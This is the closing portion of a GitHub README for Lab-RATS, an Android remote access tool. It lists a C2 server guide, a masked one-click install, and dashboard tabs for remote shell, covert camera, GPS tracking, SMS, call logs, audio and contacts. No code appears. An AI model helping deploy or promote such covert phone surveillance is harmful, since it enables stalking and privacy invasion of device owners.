| **[12-Server Setup.md](docs/12-Server_Setup.md)**                       | C2 server setup guide for Render.com and Linux VPS.                 |
| **[13-Direct IPv6 Hardening.md](docs/13-Direct_IPv6_Hardening.md)**     | Direct IPv6 connection & pre-flight security hardening guide.       |
| **[14-Free IPv6 Hosting.md](docs/14-Free_IPv6_Hosting.md)**             | Free hosting provider comparison.                                   |

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Support+the+Development" alt="Typing Banner"/>
</p>

**If** you find **Lab-RATS Useful for your Testing & Security Research**, **Please Star ⭐ the project**—it **drives further development!**

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
</p>

**Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!** *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**)*.

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=20&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Donations" alt="Typing Banner"
 />
</p>

[<img src="https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black">](https://buymeacoffee.com/k4n3co)

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Video+Clips" alt="Typing Banner"
 />
</p>

### Git Clone & APK-Builder Example *(MacBook-Air M2)*:

https://github.com/user-attachments/assets/035088f1-e906-48c6-a1a6-0f7dd0356276

---

### NEW! Masked 'One-Click' Initial Install Sequence (Samsung Flip 7)

https://github.com/user-attachments/assets/4f1722b0-f964-4d30-b315-9534e64da317

---

### Remote C2 Dashboard - Remote Shell & App Decoys:

https://github.com/user-attachments/assets/90334c9e-bae9-4c12-b2ec-2cee7d65d307

---

### Remote C2 Dashboard - Ghost Ops & Locate:

https://github.com/user-attachments/assets/ccaae63f-493b-44b3-a662-f9d1d2792523

---

### Remote C2 Dashboard - Covert Camera Hub:

https://github.com/user-attachments/assets/c82a46fd-2a15-4e7f-864e-d4b61d6b96e9

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Screenshots" alt="Typing Banner"
 />
</p>

### 00. Lab-RATS Installed on Android Device:

<details>
  <summary>📸 View App Screenshot</summary>
  <br>
  <img src="https://github.com/user-attachments/assets/928a2a7a-a6de-4b32-93ee-7811de3b06a2" alt="Full Web Page Screenshot" width="30%">
</details>

---

### 01. Home/Terminal Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/135b9587-2bd6-4108-801d-9ac172a39851" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 02. Ghost Operations Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/32360428-a06f-4dd0-bbd2-003b249cf558" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 03. Optics/Live Camera Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/f13bd1c9-cfdb-4563-829e-30ea9483fb6e" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 04. Locate/Live GPS Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/1ca41108-a3b3-4d14-87cb-fc13fddc7957" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 05. Exploit Factory Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/4d0dcd7b-9d21-45ce-a953-bffe7783e157" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 06. Device Data/Storage Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/19b6018d-7865-4cce-96af-d65efe5c4a78" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 07. Intel/App Notifications Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/daa6be68-753e-417b-a689-2f3dcf1ad9e2" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 08. SMS/Text Message Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/64caba29-044e-431d-9e31-efd0956ba5a8" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 09. MMS/Multimedia Message Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/8068693f-e553-4168-9b77-b94f52662bed" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 10. Acoustics/Audio Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/19a031cd-0b1a-43eb-bf27-21c9706f2b7c" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 11. Comms/Call Logs Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/905549fb-e0aa-45d5-864b-3f182af896d5" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 12. Contacts Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/4dd90b25-3835-4a25-8759-c020859ba40e" alt="Full Web Page Screenshot" width="80%">
</details>

---

### 13. Hardware/Device Info Tab:

<details>
  <summary><b>📸 View Dashboard Screenshot</summary></b>
  <br>
  <img src="https://github.com/user-attachments/assets/be5d3806-e8c6-4783-ad19-bdec7f6ed2a4" alt="Full Web Page Screenshot" width="80%">
</details>

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Disclaimer" alt="Typing Banner"
 />
</p>

**Lab-RATS is for Educational and Authorized Security testing purposes ONLY!**. The **Developers & Contributors assume NO Responsibility for ANY** **Misuse, Damage to Devices or Relationships caused by this Software**. **Please use it Responsibly**. **Thank You!**

---

<p align="left">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=28&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=License" alt="Typing Banner"
 />
</p>

**Lab-RATS** is **Licensed** to **K4N3CO** under the [MIT License](LICENSE).

---

<div align="center">
  <video src="https://github.com/user-attachments/assets/2892c9d5-724a-4809-bf3f-1ccd585de0e7" width="50%" controls></video>
</div>

<p align="center">
<img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind...-cyan?style=for-the-badge&logo=maserati&logoColor=black">
<br>
<p align="center">
<img src="https://img.shields.io/badge/©2026-K4N3CO-darkred?style=for-the-badge&logo=magisk&logoColor=white">
